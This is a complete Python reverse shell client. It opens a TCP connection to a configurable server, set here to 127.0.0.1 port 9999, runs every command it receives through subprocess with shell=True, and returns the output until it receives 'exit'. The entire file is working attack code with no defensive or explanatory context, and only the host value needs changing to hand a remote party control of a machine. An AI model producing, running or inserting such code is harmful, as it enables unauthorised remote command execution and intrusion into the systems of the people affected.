import socket
import subprocess

def reverse_shell(server_host, server_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((server_host, server_port))
        print("[+] Connected to the server.")
        
        while True:
            command = client_socket.recv(1024).decode()
            if command.lower() == "exit":
                print("[+] Exiting.")
                break
            
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except Exception as e:
                output = str(e).encode()
            
            client_socket.send(output)

if __name__ == "__main__":
    server_host = "127.0.0.1"  
    server_port = 9999
    reverse_shell(server_host, server_port)
